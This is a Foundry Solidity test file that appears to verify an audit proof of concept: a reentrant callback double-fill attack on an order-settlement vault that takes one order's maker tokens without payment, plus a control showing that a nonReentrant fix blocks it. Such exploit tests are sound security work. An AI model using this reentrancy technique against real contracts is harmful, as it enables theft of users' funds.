// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    SuperpositionVault,
    SuperpositionVaultFixed,
    MaliciousTaker,
    MiniToken,
    Maker,
    IERC20Like,
    Order
} from "./63500-double-order-attack-via-callback-mechanism-mixbytes-none-bar.sol";

contract DoubleOrderCallbackAttackTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 internal constant ORDER_MAKER_AMOUNT = 100 ether;
    uint256 internal constant ORDER_TAKER_AMOUNT = 100 ether;

    // ── Exploit: the re-entrant double-fill steals a full order's makerToken ──
    function test_exploit_doubleFill_stealsMakerTokenForFree() public {
        Exploit e = new Exploit();
        e.run();

        MiniToken makerToken1 = MiniToken(e.makerToken1Addr());

        // Attacker collected order #1's makerToken for free (no takerToken paid).
        assertEq(e.attackerBalance(), ORDER_MAKER_AMOUNT, "attacker collected order1 maker asset");
        assertEq(makerToken1.balanceOf(ATTACKER), ORDER_MAKER_AMOUNT, "100 STOLEN-MAKER delivered to attacker");
        assertEq(e.stolenAmount(), ORDER_MAKER_AMOUNT, "one full order's makerToken stolen");

        // Order #2 was also filled (the taker legitimately paid for that one).
        assertEq(e.order2Collected(), ORDER_MAKER_AMOUNT, "order2 makerToken also collected");

        // The maker received takerToken for only ONE of the two filled orders,
        // even though it gave away BOTH orders' makerToken (200 vs a fair 200
        // takerToken it should have received): it is short one full order.
        assertEq(e.makerTakerReceived(), ORDER_TAKER_AMOUNT, "maker paid for only one order");
        assertLt(e.makerTakerReceived(), 2 * ORDER_TAKER_AMOUNT, "maker under-paid vs two filled orders");
    }

    // ── Negative control: the fixed vault (direct settlement + nonReentrant)
    //    makes the identical double-fill revert; nothing is stolen. ──
    function test_control_fixedVault_doubleFillReverts() public {
        MiniToken makerToken1 = new MiniToken("Maker Token One", "STOLEN-MAKER");
        MiniToken makerToken2 = new MiniToken("Maker Token Two", "MAKER2");
        MiniToken takerToken = new MiniToken("Taker Token", "TAKER");
        Maker maker = new Maker();
        SuperpositionVaultFixed vault = new SuperpositionVaultFixed();
        MaliciousTaker taker = new MaliciousTaker(address(vault), address(takerToken));

        makerToken1.mint(address(maker), ORDER_MAKER_AMOUNT);
        makerToken2.mint(address(maker), ORDER_MAKER_AMOUNT);
        maker.approveToken(makerToken1, address(vault), type(uint256).max);
        maker.approveToken(makerToken2, address(vault), type(uint256).max);
        takerToken.mint(address(taker), ORDER_TAKER_AMOUNT);
        // Taker approves the fixed vault to pull its takerToken (direct settlement).
        vm.prank(address(taker));
        takerToken.approve(address(vault), type(uint256).max);

        Order memory o1 = Order({
            maker: address(maker),
            makerToken: IERC20Like(address(makerToken1)),
            takerToken: IERC20Like(address(takerToken)),
            makerAmount: ORDER_MAKER_AMOUNT,
            takerAmount: ORDER_TAKER_AMOUNT
        });
        Order memory o2 = Order({
            maker: address(maker),
            makerToken: IERC20Like(address(makerToken2)),
            takerToken: IERC20Like(address(takerToken)),
            makerAmount: ORDER_MAKER_AMOUNT,
            takerAmount: ORDER_TAKER_AMOUNT
        });
        taker.configure(o1, o2);

        // The re-entrant double-fill hits the nonReentrant guard and reverts.
        vm.expectRevert();
        taker.attack();

        // Nothing was stolen: maker keeps both maker tokens; attacker has none.
        assertEq(makerToken1.balanceOf(address(maker)), ORDER_MAKER_AMOUNT, "maker keeps order1 asset");
        assertEq(makerToken2.balanceOf(address(maker)), ORDER_MAKER_AMOUNT, "maker keeps order2 asset");
        assertEq(makerToken1.balanceOf(ATTACKER), 0, "attacker stole nothing under the fix");
    }
}
